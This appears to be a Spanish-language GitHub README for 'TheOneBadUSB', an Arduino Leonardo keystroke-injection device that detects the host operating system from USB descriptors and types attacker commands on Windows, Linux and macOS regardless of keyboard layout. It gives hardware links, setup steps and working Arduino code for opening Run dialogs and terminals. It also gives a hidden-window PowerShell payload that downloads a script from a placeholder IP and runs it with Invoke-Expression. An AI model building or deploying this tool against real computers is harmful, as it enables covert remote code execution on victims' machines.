# TheOneBadUSB
One BadUSB to rule them all

# English
TODO

# Español
[TOC]



![000IMG_6482.JPG](:/b91953f24368439392a5075287ce9acf)


## Introducción
Lo primero que quiero aclarar es que esto sí va a ser otro artículo sobre BadUSB, aunque espero que no sea solo uno más. Esto es algo de lo que al menos yo nunca había visto una implementación completa y siempre ha sido algo que he buscado y he intentado conseguir. Por todas partes te encuentras artículos sobre "Rubber Ducky por 1 euro con Arduino" que utilizan siempre la placa "Attiny85", que se puede configurar perfectamente y si eres capaz de no comerte tú propio payload cada vez que lo conectas a tu ordenador para modificarlo funciona correctamente. Pero siempre siendo muy limitado.

Estos proyectos funcionan como teclado básico, pero no es lo que buscaba. Pero lo que buscaba tampoco lo he encontrado para el Rubber Ducky original con sus 50 dólares, ni siquiera con el Bash Bunny que vale sus 100 dólares. Lo más parecido que encontré fue un script para este último que te identificaba el SO montándose como tarjeta de red primero y tirando un Nmap, cosa que hoy en día, con un Windows por defecto no funciona ya que el firewall hace que no se responda a nada. 

## Proyecto

La idea que yo buscaba era la forma de detectar el sistema operativo de la máquina y ejecutar el payload en función de este sin tener que estar ahí para verlo o tener que cambiar switches o tocar nada. Simplemente enchufar y listo. Y para ello encontré un GitHub de un proyecto un poco olvidado que implementaba esta opción en placas Arduino con Leonardo. Su idea es simple, utilizar los descriptores USB (USB Descriptors) para detectar el sistema operativo en función de estos. Me gustó y me puse a buscar placas de este tipo y encontré la placa "ATmega32U4" que utiliza Arduino Leonardo.

Buscando implementaciones baratas y pequeñas encontré una con micro USB en Amazon no demasiado caras que utilicé para probar el GitHub. Funcionó sorprendentemente bien a la primera en todos los sistemas que tenía a mano (Windows, debían, Ubuntu y macOS). En el caso de Linux al solo obtener esta información puede ser desde un Ubuntu hasta Android, pero podemos tirar a lo clásico y apuntar a Ubuntu.

La segunda idea, como aparece en el título, era buscar una forma de escribir en cualquier ordenador sin importar el lenguaje y su destitución de teclado. (Esta segunda idea sigue sin estar perfecta, por si a alguien se le ocurre algo). En Linux estoy limitado a utilizar hexadecimal para escribir, por lo que necesito que el teclado sea más o menos normal, pero sí que es capaz de escribir cualquier cosa estando el teclado en español o en inglés sin preocuparse, por ejemplo.

Ya acabada la introducción me pongo con lo técnico. Cualquier duda, mejora o comentario me podéis escribir. Yo encantado. 

NOTA: No tengo ni idea de Arduino, solo lo he utilizado para estos proyectos, por lo que esta es la primera vez que programo aquí. Si he cometido alguna atrocidad y alguien me puede ayudar sería genial.

## Hardware utilizado
A continuación, pongo los enlaces de AliExpress y Amazon de lo que he utilizado.
- [Beetle Leonardo-mini Placa de desarrollo, USB, ATMEGA32U4](https://es.aliexpress.com/item/32617886318.html?spm=a2g0s.9042311.0.0.274263c0ReXroY): Placa muy parecida a la clásica Attiny85 por unos 3,8 euros cada una. 
- [Teclado CJMCU-VIRTUAL, USB, TF, ATMEGA32U](https://es.aliexpress.com/item/4001268341850.html?spm=a2g0s.9042311.0.0.274263c0ReXroY): Placa con ranura USB por unos 6,5 euros. 




![11IMG_6467.JPG](:/7548e97175384caaacd67fac796178e6)




## Instalación
Para montar el BadUSB es necesario tener una placa compatible con Arduino Leonardo (como las mencionadas anteriormente) y seguir lo siguientes pasos:

1. Instalar el [IDE de Arduino](https://www.arduino.cc/en/software).
2. Importar las bibliotecas [FingerprintUSBHost](https://github.com/keyboardio/FingerprintUSBHost) y [HID](https://github.com/NicoHood/HID) en Arduino IDE. Para ello se puede seguir la [guía oficial](https://www.arduino.cc/en/pmwiki.php?n=Guide/Libraries).
3. Descargar el GitHub de [TheOneBadUSB](https://github.com/RaulCalvoLaorden/TheOneBadUSB).
4. Abrir el fichero TheOneBadUSB.ino con el IDE de Arduino.
5. Modificar en la función "Loop" los diferentes payloads a ejecutar en cada Sistema Operativo.
6. Insertar la placa de Arduino.
7. Pulsar el botón de "Upload" arriba a la izquierda.
8. Quitar el USB para que no se ejecute en nuestro ordenador. 

Una vez realizados estos pasos el BadUSB está preparado y listo para ejecutarse. Dependiendo de los equipos es recomendable modificar los tiempos de espera al ejecutar el código. Está pensado para funcionar en cualquier equipo, pero si es muy antiguo puede que no funcione por no esperar lo suficiente o en equipos muy buenos pierdes tiempo esperando de más. 

### Opciones extra

En el fichero TheOneBadUSB.ino se pueden modificar también las funciones execWindows, execLinux y execMacOS para realizar otros tipos de ataque que no sean de ejecución de código en la terminal directamente. 

## Funcionalidades

A continuación, se van a explicar las funcionalidades por separado con pequeñas muestras del código para entender el código publicado en el [GitHub](https://github.com/RaulCalvoLaorden/TheOneBadUSB). 

Los ejemplos de ejecución son muy simples, pero se puede sustituir por cualquier línea de Powershell, cmd, Bash, etc. Para no estar modificando todo el rato el código de Arduino yo recomiendo ejecutar una pequeña línea que se conecte a un servidor o a GitHub y descargue un script completo que se pueda modificar fácilmente. Esto permite que se ejecute más rápidamente, ya que la línea que tiene que escribir en la victima es siempre igual de larga sin importar la longitud del script a ejecutar.

### Detectar Sistema Operativo desde Arduino

Para detectar el Sistema operativo he utilizado FingerprintUSBHost, es un proyecto que lleva inactivo desde 2018 pero me ha funcionado perfectamente. Utiliza los descriptores USB para diferenciar el sistema operativo del host al que está conectado. Es un proceso bastante simple que nos dice si es:
- Windows
- Linux
- MacOS

A la hora del ataque donde más problemas se puede encontrar es en el caso de Linux, ya que Linux puede ser gran número de distribuciones diferentes, incluido Android, por supuesto. Pero en un ataque se puede implementar para no atacar a nada que no sea un Windows o configurarlo para atacar Ubuntu, por ejemplo. 

Para ello se importa la biblioteca y en el setup se ejecuta la función almacenando en la variable "os" el sistema que ha detectado. Esta variable luego se comprueba en el bucle principal para decidir que payload tiene que ejecutar. 

``` Arduino
void setup() {
  pinMode(pinLed, OUTPUT);
  pinMode(pinButton, INPUT_PULLUP);

  // Sends a clean report to the host. This is important on any Arduino type.
  BootKeyboard.begin();

  Keyboard.begin();

  delay(1000); // Take a moment to let things settle

  FingerprintUSBHost.guessHostOS(os);
  //String stuff = "I think the Host OS is " + os;

}
```

### Escribir en cualquier distribución de teclado
 
Un problema frecuente a la hora de atacar con un Bad USB, Rubber Ducky o lo que sea siempre ha sido el lenguaje y configuración de teclado (porque hay gente que usa distribuciones que no son Qwerty como, por ejemplo, Colemak). Para este proyecto se ha usado las opciones de ALT con el pad numérico en Windows, esto nos permiten escribir en cualquier lenguaje y distribución de Windows y en cualquier lenguaje.

#### Windows
Para esta implementación se inicializan los datos de los pines para poder obtener el estado del Block Num, pudiendo así activarlo. En el siguiente código también se puede ver como se enciende el led al comenzar para poder ver cuando se está ejecutando y poder sacarlo cuando se apague antes de que entre de nuevo en el bucle. 

``` Arduino
  // LED ON.
  digitalWrite(pinLed, HIGH);


  // Get block Number status and activate if needed
  if (BootKeyboard.getLeds() & LED_NUM_LOCK) {
    //Keyboard.println(LED_NUM_LOCK);
  } else {
    Keyboard.press(KEY_NUM_LOCK);
    Keyboard.releaseAll();
  }
```

Se ha creado una función para convertir el texto de char a su número en ASCII. 

``` Arduino
char* ascii_convert(char string)
{
  if (string == ' ') return "32";
  if (string == '!') return "33";
.
.
.
  if (string == '}') return "125";
  if (string == '~') return "126";
  Keyboard.print(string);
  return "000";
}

```

Y, por último, una función para escribir cada número pulsando ALT y usando los números del pad. 

``` Arduino
void writeLetterWindows(char *string)
{
  int count, length;
  length = strlen(string);

  Keyboard.press(KEY_LEFT_ALT);

  for (count = 0 ; count < length ; count++)
  {
    char a = string[count];
    if (a == '1') {
      Keyboard.press(KEYPAD_1);
      Keyboard.release(KEYPAD_1);
    }
```

También se ha creado una función a la que le llega el texto a escribir y utiliza las funciones anteriores para escribirlo. 

``` Arduino
void writeLineWindows(char *string)
{
  int count, length;
  length = strlen(string);
  for (count = 0 ; count < length ; count++)
  {
    char a = string[count];
    writeLetterWindows(ascii_convert(a));
  }
}
```


Con estas funciones creadas ya se puede llamar a la principal que abre "Ejecutar" y escribe la línea que le pases por parámetro. 

``` arduino
void execWindows(char *string)
{
  Keyboard.press(KEY_LEFT_GUI);     // Press and hold the Windows key.
  delay(100);                       // Wait for the computer to register the press.
  Keyboard.releaseAll();            // Release both of the above keys.

  delay(1000);                     // Wait for the Windows Run Dialog to open.
  writeLineWindows("run");           // Type "run".
  delay(100);                      // Wait for the Windows Run Dialog to open.

  Keyboard.press(KEY_RIGHT_ARROW); // Press right because enter alone doesnt work, idk
  delay(400);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);       // Press the Enter key.
  delay(100);                       // Wait for the computer to register the press.
  Keyboard.releaseAll();            // Release the Enter key.

  writeLineWindows(string);

  Keyboard.press(KEY_RETURN);       // Press the Enter key.
  delay(100);                       // Wait for the computer to register the press.
  Keyboard.releaseAll();            // Release the Enter key.

}
```

### Escribir en cualquier idioma de teclado

En el caso de Linux y macOS no es posible escribir en cualquier distribución de teclado, pero teniendo en cuenta que el más habitual sin duda es Qwerty podemos atacar a este independientemente del idioma de teclado que tenga configurado. 

Esto se consigue en Linux con CTRL+SHIFT+u y Unicode y en macOS con CTRL+GUI+SPACE y escribiendo después "u+" y el código del caracter en unicode.  


#### Linux

La implementación para Linux sigue un proceso muy parecido al de Windows, pero a la hora de convertir los caracteres se utiliza una tabla Unicode:
``` arduino
char* unicode_convert(char string)
{
  if (string == ' ') return "20";
  if (string == '!') return "21";
.
.
.
  if (string == '}') return "7D";
  if (string == '~') return "7E";
  
  Keyboard.print(string);
  return "000";
}
```
El problema al usar Unicode de esta forma es que es necesario utilizar el valor hexadecimal, por lo que necesitamos saber dónde están las letras ABCDEF, que en teclados qwerty de diferentes idiomas están en el mismo sitio, pero el resto no. 

La función para escribir la letra es muy parecida a la de Windows, pero en vez de usar ALT, se utiliza CTRL+Shift+u y después se escribe el hexadecimal utilizando aquí los números normales, no los pad (para evitar que falle cuando están desactivados). 

``` arduino
void writeLetterLinux(char *string)
{

  int count, length;
  length = strlen(string);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.print("u");
  Keyboard.releaseAll();

  for (count = 0 ; count < length ; count++)
  {
    char a = string[count];
    if (a == '1') {
      Keyboard.print("1");
    }
```
A la hora de escribir textos se utiliza una función muy parecida pero modificada para el Linux. Y al ejecutar el payload se ha implementado pensando en un Ubuntu por defecto en este ejemplo. 

``` Arduino
void execLinux(char *string)
{
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.print("t");
  Keyboard.releaseAll();

  delay(200);
  Keyboard.releaseAll();            // Release both of the above keys.

  delay(1000);                     // Wait for the Linux terminal open.

  writeLineLinux(string);

  Keyboard.press(KEY_RETURN);       // Press the Enter key.
  delay(100);                       // Wait for the computer to register the press.
  Keyboard.releaseAll();            // Release the Enter key.

  //delay(1000);
}
```


#### macOS
El caso de macOS es una mezcla entre el de Windows y el de Linux. Para poder escribir cualquier tecla en cualquier idioma se ha utilizado la combinación: CTRL+GUI+SPACE Y en la ventana que se abre se escribe "u+" y el código en Unicode. Para esto último se ha utilizado la misma función que en Linux y para escribir cada tecla es la misma función, pero con la combinación de macOS. 

La función que sí se ha creado para este sistema es la de ejecución de código en la terminal. Como se puede ver abre una terminal y a continuación escribe la línea pasada por parámetro. 

``` Arduino
//Payload to exec in terminal MacOS
void execMacOS(char *string) {
  Keyboard.press(KEY_LEFT_GUI);     // Press and hold the Windows key.
  Keyboard.press(KEY_SPACE);
  Keyboard.releaseAll();

  delay(500);                     // Wait 

  //writeLineMacOS("terminal"); not working
  Keyboard.println("terminal"); //only for qwerty
  
  delay(500);                       // Wait

  Keyboard.press(KEY_RETURN);       // Press the Enter key.
  delay(200);                       // Wait for the computer to register the press.
  Keyboard.releaseAll();            // Release the Enter key.

  writeLineMacOS(string);

  Keyboard.press(KEY_RETURN);       // Press the Enter key.
  delay(100);                       // Wait for the computer to register the press.
  Keyboard.releaseAll();            // Release the Enter key.

}
```

#### EXTRA: Payloads desde la SD 

En este método se puede añadir la biblioteca para identificar el Sistema Operativo y leer diferentes ficheros en función del tipo. No me he metido a modificar el código de Seytonic más de la cuenta, pero también se podría ejecutar en cualquier idioma con los mismos métodos que en Arduino directamente, ya que el procesado de cada carácter se hace en el código. Pero eso lo dejo para el futuro. 

Para instalar esté método se necesita una placa con lector de tarjetas microSD y es igual que el anteriormente mencionado, pero cambiando el repositorio TheOneBadUSB por el fork que tengo añadiendo el detector de SO que se puede encontrar [aquí](https://github.com/RaulCalvoLaorden/Duckduino-microSD)

Una vez montado todo se tienen que crear 3 ficheros en la tarjeta SD:
- windows.txt
- linux.txt
- macos.txt

Cada uno con el código habitual. 
Por ejemplo, payload que se descarga un script de PowerShell de una IP y lo ejecuta en segundo plano:

``` 
DELAY 500
GUI r
DELAY 400
STRING powershell.exe  -windowstyle hidden $ie = Invoke-WebRequest "http://IP/ps.txt" -UseBasicParsing | Select-Object -Expand Content ; Invoke-Expression $ie
ENTER
```
## TODO

- En Linux y macOS escribir las letras de qwerty con 'Keyboard.print()' para ir más rápido (sobre todo en macOS que actualmente va a letra por segundo, si solo los caracteres especiales tardan tanto seria perfecto). 

## REF
- https://www.arduino.cc/en/Reference/KeyboardModifiers
- https://github.com/keyboardio/FingerprintUSBHost
- https://github.com/Seytonic/Duckduino-microSD
- https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads
- https://github.com/NicoHood/HID

